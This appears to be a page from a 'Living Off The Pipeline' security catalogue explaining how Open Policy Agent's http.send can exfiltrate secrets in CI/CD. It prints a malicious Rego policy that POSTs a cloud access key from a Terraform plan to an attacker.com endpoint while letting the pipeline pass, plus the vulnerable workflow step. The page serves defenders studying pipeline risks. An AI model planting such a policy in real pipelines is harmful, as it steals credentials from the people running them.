---
layout: tool
title: opa
parent: Living Off The Pipeline
nav_order: 38
---

## Living Off The Pipeline - opa (Open Policy Agent)

`OPA` (Open Policy Agent) is a policy engine used to enforce rules on structured data. While it is a security tool, its policy language, Rego, contains powerful built-in functions that can be abused, making `opa` a subtle but effective "Living Off The Pipeline" (LOTP) gadget.

### First-Order LOTP Gadget

`OPA` is a **First-Order LOTP Gadget**. It does not provide RCE, but it can be tricked by a malicious policy file into exfiltrating sensitive data over the network.

#### Malicious Primitive: Arbitrary Network Access (Data Exfiltration)

The Rego language is sandboxed and cannot execute shell commands or read arbitrary files. However, it contains a built-in function, `http.send`, which is designed to allow policies to fetch external data. An attacker can abuse this function to make arbitrary HTTP requests to their own server.

While Rego cannot read environment variables directly, CI/CD pipelines often run `opa eval` against input files (e.g., a Terraform plan as JSON, a Kubernetes manifest) that may contain secrets. An attacker can write a malicious Rego policy that reads a secret from the `input` document and uses `http.send` to exfiltrate it.

### Second-Order LOTP Attack Chain

1.  **Attacker's PR:** An attacker submits a pull request containing a malicious Rego policy file.
    ```rego
    # policy.rego
    package main

    # This rule will be evaluated by 'opa eval'
    allow {
        # Malicious Payload:
        # This exfiltrates a secret from the input document to the attacker.
        http.send({
            "method": "POST",
            "url": "http://attacker.com/exfil",
            "body": { "stolen_key": input.provider_configs[0].expressions.access_key.constant_value }
        })

        # The rule can still return true to avoid failing the pipeline step.
        1 == 1
    }
    ```

2.  **Vulnerable Workflow:** The pipeline contains a standard command to validate a Terraform plan that has been converted to JSON.
    ```yaml
    - name: Validate Terraform Plan
      run: |
        terraform show -json . > plan.json
        opa eval --data policy.rego --input plan.json "data.main.allow"
    ```

3.  **Execution:**
    *   The `opa eval` command is executed.
    *   It evaluates the attacker's malicious policy against the `plan.json` file.
    *   The `http.send` function is called, which reads the cloud provider access key from the Terraform plan (`input`) and sends it to the attacker's server.

This attack is dangerous because `opa` is a trusted security tool, and a pipeline operator would not expect a policy evaluation to make outbound network calls. The malicious activity is hidden within the logic of the Rego policy file.

### References

*   [OPA Docs: `http.send` built-in](https://www.openpolicyagent.org/docs/latest/policy-reference/#http)
